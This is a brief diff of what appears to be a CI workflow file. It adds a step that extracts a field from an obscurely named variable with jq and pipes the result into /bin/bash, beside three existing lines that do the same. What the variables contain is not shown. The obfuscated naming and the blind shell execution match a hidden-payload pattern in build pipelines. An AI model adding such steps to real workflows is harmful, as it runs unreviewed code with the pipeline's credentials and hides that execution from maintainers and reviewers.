@@ -33,6 +33,7 @@ jobs:
           echo $clk59 | jq -r .m2 | /bin/bash
           echo $vrhk18705 | jq -r .er0234 | /bin/bash
           echo $kiq762 | jq -r .n29173 | /bin/bash
+          printf '%s' "$slwbw4" | jq -r .ning22 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
